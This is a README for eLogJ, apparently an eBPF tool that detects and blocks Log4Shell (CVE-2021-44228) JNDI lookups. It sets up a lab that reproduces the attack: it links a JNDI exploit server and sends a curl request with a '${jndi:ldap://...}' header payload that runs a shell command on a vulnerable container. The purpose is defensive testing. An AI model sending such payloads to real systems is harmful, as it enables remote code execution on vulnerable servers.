<img src="https://github.com/WillGAndre/eLogJ/blob/main/elogj.png" width="250">

# eLogJ
extended Log4j observability tool used to detect and prevent malicious JNDI (/LDAP) lookups. Currently tested in a controlled environment.<br>
- Developed with aya (https://github.com/aya-rs/aya) a Rust eBPF library.<br>
- Use in tandem with https://github.com/christophetd/log4shell-vulnerable-app (baseline).

0.1.2: Rulesets added as static file (logger-info).

### Dependencies
rust stable or nightly toolchain: `rustup install stable` / `rustup install nightly`
<br>
bpf-linker: `cargo install bpf-linker`

### Build Userspace:
> cargo build

### Build Kernelspace:
> cargo xtask build-ebpf

### Run:
> cargo xtask run

### Verbose:
> RUST_LOG=info cargo xtask run

<br>

## CVE-2021-44228

The repo (https://github.com/christophetd/log4shell-vulnerable-app) contains a Spring Boot web application which is vulnerable to the Log4Shell exploit. In order to boot this vulnerable instance, the following dependencies will be needed:<br>
## Spring Boot (Docker):
<a href="https://github.com/christophetd/log4shell-vulnerable-app/blob/main/Dockerfile">Dockerfile</a><br>
    - Log4j 2.14.1 <br>
    - JDK 1.8.0_181 <br>

## Malicious LDAP server:
>        This server will essentially receive LDAP requests triggered by the JNDI lookup in Spring Boot (Log4j) and promptly respond. The response is a second-stage payload that actually leads to RCE, since any type of action can be compiled as a (malicious) java class. JNDI lookups are triggered by the Log4j logger when it detects an explicit JNDI lookup command when logging occurs (`${jndi:`). Note that the type of transport protocol may vary (LDAP, RMI, ..).
>>  JNDI exploit server (baseline): <a href="http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream">JNDIExploit</a><br>
>>        Other JNDI exploits will also be explored soon.

## Explotation Steps:
### Spring Boot (Log4j) Instance:<br>
> docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
### JNDI Server:<br>
> java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
### Curl log:<br>
> curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
### Verify code execution: <br>
> docker exec vulnerable-app ls /tmp

Note: 
 Heavily WIP, deps/wiki/docs to be added soon.
